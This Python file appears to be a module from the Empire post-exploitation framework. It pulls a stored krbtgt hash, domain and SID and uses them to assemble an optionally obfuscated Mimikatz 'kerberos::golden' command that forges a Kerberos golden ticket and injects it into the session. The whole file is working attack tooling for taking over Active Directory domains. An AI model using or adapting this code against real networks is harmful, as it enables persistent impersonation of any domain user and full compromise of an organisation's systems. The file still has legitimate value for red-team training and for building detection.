import logging

from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message

log = logging.getLogger(__name__)


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    return handle_error_message("[!] CredID is invalid!")

                if cred.username != "krbtgt":
                    return handle_error_message("[!] A krbtgt account must be used")

                if cred.domain != "":
                    params["domain"] = cred.domain
                if cred.sid != "":
                    params["sid"] = cred.sid
                if cred.password != "":
                    params["krbtgt"] = cred.password

        if params["krbtgt"] == "":
            log.error("krbtgt hash not specified")

        # build the golden ticket command
        script_end = "Invoke-Mimikatz -Command '\"kerberos::golden"

        for option, values in params.items():
            if (
                option.lower() != "agent"
                and option.lower() != "credid"
                and values
                and values != ""
            ):
                script_end += " /" + str(option) + ":" + str(values)

        script_end += " /ptt\"'"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
